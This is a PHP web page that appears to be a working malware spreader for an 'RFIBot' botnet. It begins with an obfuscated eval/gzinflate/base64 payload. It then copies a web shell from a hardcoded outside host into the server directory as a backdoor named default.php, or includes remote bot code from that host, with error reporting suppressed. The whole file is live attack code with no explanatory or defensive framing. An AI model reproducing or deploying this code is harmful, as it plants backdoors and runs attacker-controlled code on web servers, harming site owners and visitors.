<?  eval(gzinflate(base64_decode("y03MzNFQSq1IzC3wTHVIzQVy9ZLzc5V0lBJLShKTMxTSivJzFZT0VOKDXYPCXIOilYJcff1DXOMd
XVyClGL1lBTy81CkIXS8n6Ovq1KsjpKrX5gVUL6gKDOvJL5IQyUeKKBjqKmnFJMHUYkqCxGDKnB3
DUGVBQpApQL8g9HkQCJASU1rAA=="))); ?><html><style>
body {font:10pt tahoma;color:#ff0000;background:black;margin:4;font-weight:bold;}
</style><body>
<?php
###[ SEMBON CrEw SPREAD for RFIBot (2.3) ]###
error_reporting(0);
##### CONFIG #####
$mode = $_GET["mode"]; 

$url = 'http://www.starhunting.co.kr/log/.log/'; //URL path
$src = $url.'cmd'; //Source Shell
$shell = 'default.php'; //Backdoor PHPShell name
$bot = $url.'bot'; //Source PHPBot

##### SPREAD #####
switch ($mode) {
case "bot":
include($bot);
break;
default:
$exec=array(@getcwd().DIRECTORY_SEPARATOR,$shell);
$exec=implode("",$exec);
if(file_exists($exec)){
$exec=array(@getcwd().DIRECTORY_SEPARATOR,$shell);
$exec=implode("",$exec);}
if(!copy($src,$exec)){
die(base64_decode('TWNOIFNoZWxsOiA=').''.$exec.' Failed!'); //encode biar lebih optimal!
}
else {
echo base64_decode('TWNOIFNoZWxsOiA=').''.$exec.' Created!'; //encode biar lebih optimal!
}
break;
}
?>
</body></html>
<?php die(); ?>